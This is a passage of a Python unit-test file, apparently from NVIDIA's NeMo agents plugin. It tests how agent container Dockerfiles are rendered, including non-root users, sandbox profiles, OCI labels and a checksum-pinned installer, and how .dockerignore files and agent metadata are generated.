# SPDX-FileCopyrightText: Copyright (c) 2025-2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
# SPDX-License-Identifier: Apache-2.0

"""Unit tests for the container render / build / publish / validate / metadata modules."""

from __future__ import annotations

import os
from pathlib import Path
from typing import Any
from unittest.mock import MagicMock, patch

import pytest
import typer
from click.exceptions import Exit as ClickExit
from nemo_agents_plugin.container.errors import AgentConfigValidationError, ManagedFileConflictError

# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

VALID_CONFIG = """\
functions:
  current_datetime:
    _type: current_datetime

llms:
  llm:
    _type: openai
    api_key: not-used
    model_name: nvidia-nemotron-3-super-120b-a12b
    temperature: 0.0

workflow:
  _type: react_agent
  tool_names: [current_datetime]
  llm_name: llm
  verbose: false
"""


@pytest.fixture()
def agent_config(tmp_path: Path) -> Path:
    """Write a valid agent config and return the path."""
    p = tmp_path / "config.yaml"
    p.write_text(VALID_CONFIG)
    return p


@pytest.fixture()
def project_dir(tmp_path: Path) -> tuple[Path, Path]:
    """Create a project directory with config + pyproject. Returns (config, pyproject)."""
    (tmp_path / "configs").mkdir()
    config = tmp_path / "configs" / "config.yaml"
    config.write_text(VALID_CONFIG)
    pyproject = tmp_path / "pyproject.toml"
    pyproject.write_text('[project]\nname = "test-agent"\nversion = "2.3.0"\n')
    return config, pyproject


@pytest.fixture()
def fabric_agent_config(tmp_path: Path) -> Path:
    config = tmp_path / "agent.yaml"
    config.write_text("config_format: nemo-agents-spec-v1\nname: fabric-agent\n")
    return config


# ---------------------------------------------------------------------------
# Render tests
# ---------------------------------------------------------------------------


class TestRenderNatDockerfile:
    """Tests for the NAT Dockerfile renderer."""

    def test_render_params_keep_runtime_fields_separate(self) -> None:
        from nemo_agents_plugin.container.template import FabricRenderParams, NatRenderParams, SharedRenderParams

        shared = SharedRenderParams()
        nat = NatRenderParams(nat_version="1.8.0")
        fabric = FabricRenderParams()

        assert isinstance(nat, SharedRenderParams)
        assert isinstance(fabric, SharedRenderParams)
        assert not hasattr(shared, "nat_version")
        assert nat.nat_version == "1.8.0"
        for field in ("nat_version", "nemo_agents_version", "relay_cli_version"):
            assert not hasattr(fabric, field)

    def test_config_only_mode(self, agent_config: Path) -> None:
        from nemo_agents_plugin.container.template import render_nat_dockerfile

        result = render_nat_dockerfile(agent_config, None, nat_version="1.4.0")

        assert "nvidia-nat[most]==" in result
        assert "uv sync" not in result
        assert "NAT_CONFIG_FILE=/workspace/config.yaml" in result
        assert "ARG NAT_VERSION=1.4.0" in result
        assert "ghcr.io/astral-sh/uv:0.9.14" in result

    def test_project_mode(self, project_dir: tuple[Path, Path]) -> None:
        """Project mode trusts pyproject.toml as the single source of truth.

        The template must run exactly ``uv pip install .`` and nothing else
        dependency-related — no implicit ``nvidia-nat[most]`` pre-install
        to paper over commented-out deps, and no
        ``SETUPTOOLS_SCM_PRETEND_VERSION`` to paper over monorepo-relative
        ``[tool.setuptools_scm]`` roots.  Those are pyproject bugs the
        user is expected to fix, not workarounds the packager should bake in.
        ``uv sync`` is also avoided so ``[tool.uv.sources]`` path overrides
        don't silently pull sibling packages from outside the build context.
        """
        from nemo_agents_plugin.container.template import render_nat_dockerfile

        config, pyproject = project_dir
        result = render_nat_dockerfile(config, pyproject, nat_version="1.4.0")

        assert "uv pip install ." in result
        assert ". /workspace/.venv/bin/activate" in result
        assert "UV_LINK_MODE=copy" in result
        assert "NAT_CONFIG_FILE=/workspace/configs/config.yaml" in result

        # No dependency-workarounds baked into the install step — comments
        # mentioning these concepts are fine, but nothing in an actual RUN
        # command should reference them.
        forbidden_in_commands = (
            "uv sync",
            "nvidia-nat[most]",
            "SETUPTOOLS_SCM_PRETEND_VERSION",
        )
        for line in result.splitlines():
            if line.lstrip().startswith("#"):
                continue
            for needle in forbidden_in_commands:
                assert needle not in line, (
                    f"project mode must not workaround pyproject bugs — found {needle!r} in: {line!r}"
                )

    def test_custom_overrides(self, agent_config: Path) -> None:
        from nemo_agents_plugin.container.template import render_nat_dockerfile

        result = render_nat_dockerfile(
            agent_config,
            None,
            base_image_url="custom/image",
            base_image_tag="99.99",
            python_version="3.12",
            nat_version="2.0.0",
            uv_version="0.9.0",
        )

        assert "ARG BASE_IMAGE_URL=custom/image" in result
        assert "ARG BASE_IMAGE_TAG=99.99" in result
        assert "ARG PYTHON_VERSION=3.12" in result
        assert "ARG NAT_VERSION=2.0.0" in result
        assert "ghcr.io/astral-sh/uv:0.9.0" in result

    def test_env_var_fallback(self, agent_config: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        from nemo_agents_plugin.container.template import render_nat_dockerfile

        monkeypatch.setenv("NAT_VERSION", "1.5.0")
        monkeypatch.setenv("NEMO_AGENTS_BASE_IMAGE_URL", "env/image")
        monkeypatch.setenv("NEMO_AGENTS_BASE_IMAGE_TAG", "env-tag")
        monkeypatch.setenv("NEMO_AGENTS_PYTHON_VERSION", "3.11")
        monkeypatch.setenv("NEMO_AGENTS_UV_VERSION", "0.9.0")

        result = render_nat_dockerfile(agent_config, None)

        assert "ARG NAT_VERSION=1.5.0" in result
        assert "ARG BASE_IMAGE_URL=env/image" in result
        assert "ARG BASE_IMAGE_TAG=env-tag" in result
        assert "ARG PYTHON_VERSION=3.11" in result
        assert "ghcr.io/astral-sh/uv:0.9.0" in result

    def test_missing_nat_version_falls_back_to_default(
        self, agent_config: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """``nat_version`` now has a pinned default so renders succeed without --nat-version.

        The default is kept in sync with a release where ``nvidia-nat[most]`` and every
        plugin extra target the same core ABI (avoids runtime ImportError drift).
        """
        from nemo_agents_plugin.container.template import _DEFAULTS, render_nat_dockerfile

        monkeypatch.delenv("NAT_VERSION", raising=False)

        result = render_nat_dockerfile(agent_config, None)

        default = _DEFAULTS["nat_version"]
        assert f"ARG NAT_VERSION={default}" in result
        assert f'com.nemo.agent.nat-version="{default}"' in result

    def test_non_root_user_by_default(self, agent_config: Path) -> None:
        from nemo_agents_plugin.container.template import render_nat_dockerfile

        result = render_nat_dockerfile(agent_config, None, nat_version="1.4.0")

        assert "USER agent" in result
        assert "groupadd" in result
        assert "useradd" in result
        assert "chown -R agent:agent /workspace" in result
        # Regression: Ubuntu 24.04 "noble" (and other modern base images) ship
        # a default unprivileged user at uid/gid=1000.  The previous hardcoded
        # ``groupadd -g 1000 agent`` collided with that user and the build
        # failed with ``groupadd: GID '1000' already exists`` (exit code 4).
        # The template now reclaims uid/gid 1000 first; assert *both* guards
        # are present so a regression on either half is caught.
        assert "getent passwd 1000" in result
        assert "getent group  1000" in result
        assert "userdel -rf" in result
        assert "groupdel -f" in result

    def test_allow_root_skips_user(self, agent_config: Path) -> None:
        from nemo_agents_plugin.container.template import render_nat_dockerfile

        result = render_nat_dockerfile(agent_config, None, nat_version="1.4.0", allow_root=True)

        assert "USER agent" not in result
        assert "groupadd" not in result

    @staticmethod
    def _fake_profile():
        from nemo_platform_plugin.sandbox import SandboxImageProfile, SandboxUser

        return SandboxImageProfile(
            name="openshell",
            apt_packages=("iproute2", "nftables"),
            users=(
                SandboxUser(name="sandbox", system=True, create_home=True, home="/home/sandbox", shell="/bin/bash"),
            ),
        )

    def test_sandbox_runtime_off_by_default(self, agent_config: Path) -> None:
        from nemo_agents_plugin.container.template import render_nat_dockerfile

        result = render_nat_dockerfile(agent_config, None, nat_version="1.4.0")

        # Vanilla images must not carry any sandbox-runtime extras.
        assert "iproute2" not in result
        assert "nftables" not in result
        assert "sandbox" not in result

    def test_sandbox_runtime_renders_discovered_profile(self, agent_config: Path) -> None:
        from nemo_agents_plugin.container.template import render_nat_dockerfile

        # The packager discovers profiles by name; it never imports a provider.
        with patch(
            "nemo_agents_plugin.container.sandbox.discover_sandbox_profiles",
            return_value={"openshell": self._fake_profile()},
        ):
            result = render_nat_dockerfile(agent_config, None, nat_version="1.4.0", sandbox_runtime="openshell")

        assert "iproute2 nftables" in result
        assert "groupadd --system sandbox" in result
        assert (
            "useradd --system --gid sandbox --create-home --home-dir /home/sandbox --shell /bin/bash sandbox" in result
        )
        # Normal-container hardening + entrypoint are untouched.
        assert "USER agent" in result
        assert "exec nat serve" in result

    def test_sandbox_runtime_unknown_raises(self, agent_config: Path) -> None:
        from nemo_agents_plugin.container.template import render_nat_dockerfile

        with patch("nemo_agents_plugin.container.sandbox.discover_sandbox_profiles", return_value={}):
            with pytest.raises(ValueError, match="unknown sandbox runtime"):
                render_nat_dockerfile(agent_config, None, nat_version="1.4.0", sandbox_runtime="nope")

    def test_sandbox_runtime_independent_of_allow_root(self, agent_config: Path) -> None:
        from nemo_agents_plugin.container.template import render_nat_dockerfile

        with patch(
            "nemo_agents_plugin.container.sandbox.discover_sandbox_profiles",
            return_value={"openshell": self._fake_profile()},
        ):
            result = render_nat_dockerfile(
                agent_config, None, nat_version="1.4.0", sandbox_runtime="openshell", allow_root=True
            )

        # The sandbox user is required whether or not the agent user is created.
        assert "groupadd --system sandbox" in result
        assert "USER agent" not in result

    def test_oci_labels_present(self, agent_config: Path) -> None:
        from nemo_agents_plugin.container.template import render_nat_dockerfile

        result = render_nat_dockerfile(agent_config, None, nat_version="1.4.0")

        assert 'com.nemo.agent.id="' in result
        assert 'org.opencontainers.image.title="config"' in result
        assert 'com.nemo.agent.nat-version="1.4.0"' in result
        assert 'com.nemo.agent.contract-version="' in result
        assert 'com.nemo.agent.framework="nemo_agent_toolkit"' in result
        assert 'org.opencontainers.image.description="react_agent agent"' in result
        assert 'org.opencontainers.image.revision="' in result
        assert 'org.opencontainers.image.source="' in result

    def test_oci_labels_with_explicit_metadata(self, agent_config: Path) -> None:
        from nemo_agents_plugin.container.template import render_nat_dockerfile

        result = render_nat_dockerfile(
            agent_config,
            None,
            nat_version="1.4.0",
            agent_version="3.0.0",
            agent_author="Test Author",
        )

        assert 'org.opencontainers.image.version="3.0.0"' in result
        assert 'org.opencontainers.image.authors="Test Author"' in result

    def test_oci_labels_from_pyproject(self, project_dir: tuple[Path, Path]) -> None:
        from nemo_agents_plugin.container.template import render_nat_dockerfile

        config, pyproject = project_dir
        result = render_nat_dockerfile(config, pyproject, nat_version="1.4.0")

        assert 'org.opencontainers.image.title="test-agent"' in result
        assert 'org.opencontainers.image.version="2.3.0"' in result

    def test_oci_labels_description_and_license_from_pyproject(self, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.template import render_nat_dockerfile

        (tmp_path / "configs").mkdir()
        config = tmp_path / "configs" / "config.yaml"
        config.write_text(VALID_CONFIG)
        pyproject = tmp_path / "pyproject.toml"
        pyproject.write_text(
            '[project]\nname = "licensed-agent"\nversion = "1.0.0"\n'
            'description = "A calculator agent for math queries"\n'
            'license = "Apache-2.0"\n'
        )

        result = render_nat_dockerfile(config, pyproject, nat_version="1.4.0")

        assert 'org.opencontainers.image.description="A calculator agent for math queries"' in result
        assert 'org.opencontainers.image.licenses="Apache-2.0"' in result

    def test_oci_licenses_omitted_when_absent(self, agent_config: Path) -> None:
        from nemo_agents_plugin.container.template import render_nat_dockerfile

        result = render_nat_dockerfile(agent_config, None, nat_version="1.4.0")

        assert "org.opencontainers.image.licenses" not in result

    def test_hardened_apt_get(self, agent_config: Path) -> None:
        from nemo_agents_plugin.container.template import render_nat_dockerfile

        result = render_nat_dockerfile(agent_config, None, nat_version="1.4.0")

        assert "--no-install-recommends" in result
        assert "rm -rf /var/lib/apt/lists/*" in result

    def test_uv_python_outside_root(self, agent_config: Path, project_dir: tuple[Path, Path]) -> None:
        """Managed Python must land outside /root so the non-root user can exec it.

        Regression: before this fix, uv placed the managed interpreter at
        /root/.local/share/uv/python/... which the agent user (uid 1000) could
        not traverse, causing 'exec: nat: Permission denied' at runtime.
        """
        from nemo_agents_plugin.container.template import render_nat_dockerfile

        config_only = render_nat_dockerfile(agent_config, None, nat_version="1.4.0")
        cfg_path, pyproj = project_dir
        with_proj = render_nat_dockerfile(cfg_path, pyproj, nat_version="1.4.0")

        for result in (config_only, with_proj):
            assert "UV_PYTHON_INSTALL_DIR=/opt/uv/python" in result
            assert "UV_LINK_MODE=copy" in result
            assert "chmod -R a+rX /opt/uv /workspace/.venv" in result
            assert "/root/.local" not in result

    def test_external_template(self, agent_config: Path, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.template import render_nat_dockerfile

        custom = tmp_path / "custom.dockerfile.j2"
        custom.write_text("FROM ubuntu\nRUN echo {{ nat_version }}\n")

        result = render_nat_dockerfile(agent_config, None, nat_version="9.9.9", template_path=str(custom))

        assert "FROM ubuntu" in result
        assert "echo 9.9.9" in result


class TestFabricDockerfileTemplate:
    """Direct contract tests for the Fabric template before its renderer is wired."""

    @staticmethod
    def _render(**overrides: Any) -> str:
        from dataclasses import asdict

        from nemo_agents_plugin.container.template import (
            FABRIC_DOCKERFILE_TEMPLATE,
            FabricRenderParams,
            _jinja_env,
        )

        params = FabricRenderParams(contract_version="1.2.3", **overrides)
        return _jinja_env().from_string(FABRIC_DOCKERFILE_TEMPLATE).render(**asdict(params))

    def test_installs_matching_relay_cli_and_python_binding(self) -> None:
        from nemo_agents_plugin.container.template import (
            PINNED_NEMO_RELAY_CLI_VERSION,
            PINNED_NEMO_RELAY_INSTALLER_COMMIT,
            PINNED_NEMO_RELAY_INSTALLER_SHA256,
        )

        result = self._render()

        assert f"NVIDIA/NeMo-Relay/{PINNED_NEMO_RELAY_INSTALLER_COMMIT}/install.sh" in result
        assert f'echo "{PINNED_NEMO_RELAY_INSTALLER_SHA256}  /tmp/install-nemo-relay.sh"' in result
        assert result.index("sha256sum -c -") < result.index("NEMO_RELAY_VERSION=")
        assert f"NEMO_RELAY_VERSION={PINNED_NEMO_RELAY_CLI_VERSION}" in result
        assert f'"nemo-relay=={PINNED_NEMO_RELAY_CLI_VERSION}"' in result
        assert "--install-dir /usr/local/bin" in result
        assert "nemo-relay --version" in result
        assert "ARG NEMO_RELAY" not in result

    def test_preserves_agent_bundle_and_config_path(self) -> None:
        result = self._render(config_file_path="/workspace/configs/agent.yaml")

        assert "COPY ./ /workspace" in result
        assert "ENV AGENT_CONFIG_PATH=/workspace/configs/agent.yaml" in result
        assert "COPY agent.yaml" not in result

    def test_starts_fabric_server(self) -> None:
        result = self._render()

        assert "ENV PORT=8000" in result
        assert "ENV VIRTUAL_ENV=/workspace/.venv" in result
        assert "EXPOSE 8000" in result
        assert (
            'ENTRYPOINT ["sh", "-c", "exec python -m nemo_agents_plugin.fabric.server '
            '--agent-config \\"$AGENT_CONFIG_PATH\\" --host 0.0.0.0 --port \\"$PORT\\""]' in result
        )


class TestRenderFabricDockerfile:
    """Tests for the public Fabric Dockerfile renderer."""

    def test_config_only_mode(self, fabric_agent_config: Path) -> None:
        from nemo_agents_plugin.container.template import get_contract_version, render_fabric_dockerfile

        result = render_fabric_dockerfile(fabric_agent_config)

        install_line = next(line for line in result.splitlines() if "uv pip install" in line)
        assert "--no-sources" in install_line
        assert "--prerelease=allow" in install_line
        assert f'"nemo-platform[nemo-agents-plugin]=={get_contract_version()}"' in install_line
        assert '" .' not in install_line
        assert "ENV AGENT_CONFIG_PATH=/workspace/agent.yaml" in result
        assert "NAT_VERSION" not in result
        assert "ghcr.io/astral-sh/uv:0.9.14" in result

    def test_renders_platform_agent_oci_labels(self, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.metadata import extract_agent_metadata
        from nemo_agents_plugin.container.template import get_contract_version, render_fabric_dockerfile

        agent_config = tmp_path / "agent.yaml"
        agent_config.write_text(
            "config_format: nemo-agents-spec-v1\nname: research-assistant\ndescription: Researches technical topics\n"
        )
        metadata = extract_agent_metadata(
            agent_config,
            agent_version="2.0.0",
            agent_author="Agent Author",
        )

        result = render_fabric_dockerfile(
            agent_config,
            agent_version="2.0.0",
            agent_author="Agent Author",
        )

        assert 'org.opencontainers.image.title="research-assistant"' in result
        assert 'org.opencontainers.image.version="2.0.0"' in result
        assert 'org.opencontainers.image.authors="Agent Author"' in result
        assert 'org.opencontainers.image.description="Researches technical topics"' in result
        assert f'com.nemo.agent.id="{metadata["agent_id"]}"' in result
        assert 'com.nemo.agent.framework="nemo_platform_agent"' in result
        assert f'com.nemo.agent.contract-version="{get_contract_version()}"' in result

    def test_project_mode_preserves_relative_config_path(self, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.template import (
            PINNED_NEMO_RELAY_CLI_VERSION,
            get_contract_version,
            render_fabric_dockerfile,
        )

        configs = tmp_path / "configs"
        configs.mkdir()
        agent_config = configs / "agent.yaml"
        agent_config.write_text("config_format: nemo-agents-spec-v1\nname: fabric-agent\n")
        pyproject = tmp_path / "pyproject.toml"
        pyproject.write_text('[project]\nname = "fabric-agent"\nversion = "1.0.0"\n')

        result = render_fabric_dockerfile(agent_config, pyproject)

        install_line = next(line for line in result.splitlines() if "uv pip install" in line)
        assert "--no-sources" in install_line
        assert "--prerelease=allow" in install_line
        assert f'"nemo-platform[nemo-agents-plugin]=={get_contract_version()}"' in install_line
        assert f'"nemo-relay=={PINNED_NEMO_RELAY_CLI_VERSION}" .' in result
        assert "ENV AGENT_CONFIG_PATH=/workspace/configs/agent.yaml" in result

    def test_unresolved_contract_version_is_rejected(
        self,
        fabric_agent_config: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        import nemo_agents_plugin.container.template as template

        monkeypatch.setattr(template, "get_contract_version", lambda: "0.0.0")

        with pytest.raises(ValueError, match="Unable to resolve the installed nemo-platform contract version"):
            template.render_fabric_dockerfile(fabric_agent_config)

    def test_custom_template_uses_fabric_context(self, tmp_path: Path, fabric_agent_config: Path) -> None:
        from nemo_agents_plugin.container.template import render_fabric_dockerfile

        custom = tmp_path / "fabric.dockerfile.j2"
        custom.write_text("FROM {{ base_image_url }}:{{ base_image_tag }}\nENV CONFIG={{ config_file_path }}\n")

        result = render_fabric_dockerfile(
            fabric_agent_config,
            base_image_url="custom/image",
            base_image_tag="custom-tag",
            template_path=str(custom),
        )

        assert result == "FROM custom/image:custom-tag\nENV CONFIG=/workspace/agent.yaml\n"

    def test_shared_environment_and_explicit_overrides(
        self,
        fabric_agent_config: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        from nemo_agents_plugin.container.template import render_fabric_dockerfile

        monkeypatch.setenv("NEMO_AGENTS_BASE_IMAGE_URL", "env/image")
        monkeypatch.setenv("NEMO_AGENTS_BASE_IMAGE_TAG", "env-tag")
        monkeypatch.setenv("NEMO_AGENTS_PYTHON_VERSION", "3.12")
        monkeypatch.setenv("NEMO_AGENTS_UV_VERSION", "0.9.0")
        monkeypatch.setenv("NAT_VERSION", "9.9.9")

        from_environment = render_fabric_dockerfile(fabric_agent_config)
        explicit = render_fabric_dockerfile(
            fabric_agent_config,
            base_image_url="flag/image",
            base_image_tag="flag-tag",
            python_version="3.13",
            uv_version="0.10.0",
        )

        assert "ARG BASE_IMAGE_URL=env/image" in from_environment
        assert "ARG BASE_IMAGE_TAG=env-tag" in from_environment
        assert "ARG PYTHON_VERSION=3.12" in from_environment
        assert "ghcr.io/astral-sh/uv:0.9.0" in from_environment
        assert "ARG BASE_IMAGE_URL=flag/image" in explicit
        assert "ARG BASE_IMAGE_TAG=flag-tag" in explicit
        assert "ARG PYTHON_VERSION=3.13" in explicit
        assert "ghcr.io/astral-sh/uv:0.10.0" in explicit
        assert "9.9.9" not in from_environment + explicit

    def test_allow_root_and_sandbox_profile(self, fabric_agent_config: Path) -> None:
        from nemo_agents_plugin.container.template import render_fabric_dockerfile
        from nemo_platform_plugin.sandbox import SandboxImageProfile, SandboxUser

        profile = SandboxImageProfile(
            name="openshell",
            apt_packages=("iproute2", "nftables"),
            users=(SandboxUser(name="sandbox", system=True, create_home=True),),
        )

        with patch(
            "nemo_agents_plugin.container.sandbox.discover_sandbox_profiles",
            return_value={"openshell": profile},
        ):
            result = render_fabric_dockerfile(fabric_agent_config, sandbox_runtime="openshell", allow_root=True)

        assert "iproute2 nftables" in result
        assert "groupadd --system sandbox" in result
        assert "USER agent" not in result
        assert "nemo_agents_plugin.fabric.server" in result

    def test_config_outside_project_context_is_rejected(self, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.template import render_fabric_dockerfile

        agent_dir = tmp_path / "agent"
        project_dir = tmp_path / "project"
        agent_dir.mkdir()
        project_dir.mkdir()
        agent_config = agent_dir / "agent.yaml"
        agent_config.write_text("config_format: nemo-agents-spec-v1\nname: fabric-agent\n")
        pyproject = project_dir / "pyproject.toml"
        pyproject.write_text('[project]\nname = "fabric-agent"\nversion = "1.0.0"\n')

        with pytest.raises(ValueError, match="outside the pyproject build context"):
            render_fabric_dockerfile(agent_config, pyproject)

    def test_unreadable_custom_template_is_reported_as_value_error(
        self,
        tmp_path: Path,
        fabric_agent_config: Path,
    ) -> None:
        from nemo_agents_plugin.container.template import render_fabric_dockerfile

        missing = tmp_path / "missing.dockerfile.j2"

        with pytest.raises(ValueError, match="failed to read --template file"):
            render_fabric_dockerfile(fabric_agent_config, template_path=str(missing))


# ---------------------------------------------------------------------------
# .dockerignore tests
# ---------------------------------------------------------------------------


class TestRenderDockerignore:
    def test_writes_file(self, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.template import render_dockerignore

        path = render_dockerignore(tmp_path)
        assert path is not None  # narrow Path | None
        assert path.exists()
        assert path.name == ".dockerignore"

    def test_contents(self, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.template import render_dockerignore

        path = render_dockerignore(tmp_path)
        assert path is not None  # narrow Path | None
        content = path.read_text()
        assert ".env" in content
        assert ".git/" in content
        assert "__pycache__/" in content
        assert "*.pem" in content
        assert "credentials.json" in content
        assert ".venv/" in content
        assert "node_modules/" in content


# ---------------------------------------------------------------------------
# Metadata tests
# ---------------------------------------------------------------------------


class TestExtractAgentMetadata:
    def test_parses_agent_config_once(self, agent_config: Path) -> None:
        import nemo_agents_plugin.container.metadata as metadata

        with patch.object(metadata.yaml, "safe_load", wraps=metadata.yaml.safe_load) as mock_safe_load:
            metadata.extract_agent_metadata(agent_config, agent_author="x")

        mock_safe_load.assert_called_once()

    def test_basic_extraction(self, agent_config: Path) -> None:
        from nemo_agents_plugin.container.metadata import extract_agent_metadata

        with patch("nemo_agents_plugin.container.metadata.subprocess") as mock_sub:
            mock_sub.run.return_value = MagicMock(returncode=0, stdout="Git User\n")
            meta = extract_agent_metadata(agent_config)

        import re

        assert meta["agent_name"] == "config"
        assert re.match(r"\d{2}\.\d{2}\.\d{2}$", meta["agent_version"]), (
            f"Expected YY.MM.DD, got {meta['agent_version']}"
        )
        assert meta["agent_author"] == "Git User"
        assert meta["agent_framework"] == "nemo_agent_toolkit"
        assert len(meta["agent_id"]) == 12
        assert meta["build_timestamp"]

    def test_pyproject_overrides_name_and_version(self, project_dir: tuple[Path, Path]) -> None:
        from nemo_agents_plugin.container.metadata import extract_agent_metadata

        config, pyproject = project_dir

        with patch("nemo_agents_plugin.container.metadata.subprocess") as mock_sub:
            mock_sub.run.return_value = MagicMock(returncode=0, stdout="Someone\n")
            meta = extract_agent_metadata(config, pyproject)

        assert meta["agent_name"] == "test-agent"
        assert meta["agent_version"] == "2.3.0"

    def test_fabric_config_sets_name_and_framework(self, fabric_agent_config: Path) -> None:
        from nemo_agents_plugin.container.metadata import extract_agent_metadata

        meta = extract_agent_metadata(fabric_agent_config, agent_author="x")

        assert meta["agent_name"] == "fabric-agent"
        assert meta["agent_framework"] == "nemo_platform_agent"

    def test_pyproject_name_overrides_fabric_config_name(self, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.metadata import extract_agent_metadata

        config = tmp_path / "agent.yaml"
        config.write_text("config_format: nemo-agents-spec-v1\nname: config-name\n")
        pyproject = tmp_path / "pyproject.toml"
        pyproject.write_text('[project]\nname = "project-name"\nversion = "1.0.0"\n')

        meta = extract_agent_metadata(config, pyproject, agent_author="x")

        assert meta["agent_name"] == "project-name"

    def test_explicit_overrides_take_priority(self, agent_config: Path) -> None:
        from nemo_agents_plugin.container.metadata import extract_agent_metadata

        meta = extract_agent_metadata(
            agent_config,
            agent_version="override-v",
            agent_author="override-author",
        )

        assert meta["agent_version"] == "override-v"
        assert meta["agent_author"] == "override-author"

    def test_agent_id_is_deterministic(self, agent_config: Path) -> None:
        from nemo_agents_plugin.container.metadata import extract_agent_metadata

        meta1 = extract_agent_metadata(agent_config, agent_author="x")
        meta2 = extract_agent_metadata(agent_config, agent_author="x")
        assert meta1["agent_id"] == meta2["agent_id"]

    def test_agent_id_differs_for_different_config(self, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.metadata import extract_agent_metadata

        c1 = tmp_path / "a.yaml"
        c1.write_text("workflow:\n  _type: react_agent\n")
        c2 = tmp_path / "b.yaml"
        c2.write_text("workflow:\n  _type: tool_calling_agent\n")

        m1 = extract_agent_metadata(c1, agent_author="x")
        m2 = extract_agent_metadata(c2, agent_author="x")
        assert m1["agent_id"] != m2["agent_id"]

    def test_fabric_agent_id_includes_runtime_contract(self, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.metadata import extract_agent_metadata

        config = tmp_path / "agent.yaml"
        config.write_text("config_format: nemo-agents-spec-v1\nname: research-assistant\n")
        baseline = {
            "agent_framework": "nemo_platform_agent",
            "contract_version": "1.0.0",
            "nemo_relay_cli_version": "0.6.0",
        }

        baseline_id = extract_agent_metadata(config, agent_author="x", build_env=baseline)["agent_id"]

        for key, value in (
            ("agent_framework", "different-runtime"),
            ("contract_version", "2.0.0"),
            ("nemo_relay_cli_version", "0.7.0"),
        ):
            changed = {**baseline, key: value}
            assert extract_agent_metadata(config, agent_author="x", build_env=changed)["agent_id"] != baseline_id

    def test_no_workflow_key_gives_unknown_framework(self, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.metadata import extract_agent_metadata

        config = tmp_path / "config.yaml"
        config.write_text("llms:\n  llm: {}\n")

        meta = extract_agent_metadata(config, agent_author="x")
        assert meta["agent_framework"] == "unknown"

    def test_nat_metadata_ignores_platform_only_top_level_fields(self, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.metadata import extract_agent_metadata

        config = tmp_path / "nat-config.yaml"
        config.write_text(
            "name: platform-style-name\ndescription: Platform-style description\nworkflow:\n  _type: react_agent\n"
        )

        meta = extract_agent_metadata(config, agent_author="x")

        assert meta["agent_name"] == "nat-config"
        assert meta["agent_framework"] == "nemo_agent_toolkit"
        assert meta["description"] == "react_agent agent"

    def test_git_failure_falls_back_to_unknown(self, agent_config: Path) -> None:
        from nemo_agents_plugin.container.metadata import extract_agent_metadata

        with patch("nemo_agents_plugin.container.metadata.subprocess") as mock_sub:
            mock_sub.run.side_effect = FileNotFoundError
            mock_sub.TimeoutExpired = TimeoutError
            meta = extract_agent_metadata(agent_config)

        assert meta["agent_author"] == "unknown"

    def test_agent_id_includes_pyproject(self, project_dir: tuple[Path, Path]) -> None:
        from nemo_agents_plugin.container.metadata import extract_agent_metadata

        config, pyproject = project_dir

        meta_with = extract_agent_metadata(config, pyproject, agent_author="x")
        meta_without = extract_agent_metadata(config, agent_author="x")
        assert meta_with["agent_id"] != meta_without["agent_id"]

    def test_description_from_pyproject(self, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.metadata import extract_agent_metadata

        config = tmp_path / "config.yaml"
        config.write_text(VALID_CONFIG)
        pyproject = tmp_path / "pyproject.toml"
        pyproject.write_text('[project]\nname = "my-agent"\ndescription = "Handles math queries"\n')

        meta = extract_agent_metadata(config, pyproject, agent_author="x")
        assert meta["description"] == "Handles math queries"

    def test_fabric_description_and_pyproject_override(self, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.metadata import extract_agent_metadata

        config = tmp_path / "agent.yaml"
        config.write_text(
            "config_format: nemo-agents-spec-v1\nname: research-assistant\ndescription: Config description\n"
        )
        pyproject = tmp_path / "pyproject.toml"
        pyproject.write_text(
            '[project]\nname = "research-assistant"\nversion = "1.0.0"\ndescription = "Project description"\n'
        )

        assert extract_agent_metadata(config, agent_author="x")["description"] == "Config description"
        assert extract_agent_metadata(config, pyproject, agent_author="x")["description"] == "Project description"

    def test_description_fallback_to_workflow_type(self, agent_config: Path) -> None:
        from nemo_agents_plugin.container.metadata import extract_agent_metadata

        meta = extract_agent_metadata(agent_config, agent_author="x")
        assert meta["description"] == "react_agent agent"

    def test_description_empty_when_no_workflow(self, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.metadata import extract_agent_metadata

        config = tmp_path / "config.yaml"
        config.write_text("llms:\n  llm: {}\n")

        meta = extract_agent_metadata(config, agent_author="x")
        assert meta["description"] == ""

    def test_licenses_from_pyproject_string(self, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.metadata import extract_agent_metadata

        config = tmp_path / "config.yaml"
        config.write_text(VALID_CONFIG)
        pyproject = tmp_path / "pyproject.toml"
        pyproject.write_text('[project]\nname = "x"\nlicense = "Apache-2.0"\n')

        meta = extract_agent_metadata(config, pyproject, agent_author="x")
        assert meta["licenses"] == "Apache-2.0"

    def test_licenses_from_pyproject_legacy_dict(self, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.metadata import extract_agent_metadata

        config = tmp_path / "config.yaml"
        config.write_text(VALID_CONFIG)
        pyproject = tmp_path / "pyproject.toml"
        pyproject.write_text('[project]\nname = "x"\nlicense = {text = "MIT"}\n')

        meta = extract_agent_metadata(config, pyproject, agent_author="x")
        assert meta["licenses"] == "MIT"

    def test_licenses_empty_when_absent(self, agent_config: Path) -> None:
        from nemo_agents_plugin.container.metadata import extract_agent_metadata

        meta = extract_agent_metadata(agent_config, agent_author="x")
        assert meta["licenses"] == ""

    def test_revision_from_git(self, agent_config: Path) -> None:
        from nemo_agents_plugin.container.metadata import extract_agent_metadata

